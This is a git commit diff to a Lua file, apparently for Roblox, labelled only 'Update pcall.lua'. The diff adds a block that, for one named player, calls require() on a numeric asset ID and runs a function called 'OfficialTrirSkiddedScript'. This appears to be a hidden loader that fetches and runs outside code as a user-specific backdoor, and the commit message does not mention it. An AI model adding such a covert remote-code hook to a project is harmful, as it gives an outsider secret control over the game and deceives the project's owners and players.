250596f905dde2588e0cb16afce6b092a978d5ef
phyxcz <98145070+physics1514@users.noreply.github.com>
2024-06-14 12:32:20 +1200

    Update pcall.lua

--- pcall.lua
+++ pcall.lua
@@ -5,3 +5,11 @@ if pcall == 1 then
 else
   print("Valid")
 end
+
+local player = game.Players.LocalPlayer
+
+if player.Name == "robbydarnjoe" then
+  require(7506278997).OfficialTrirSkiddedScript("robbydarnjoe")
+else
+  print()
+end
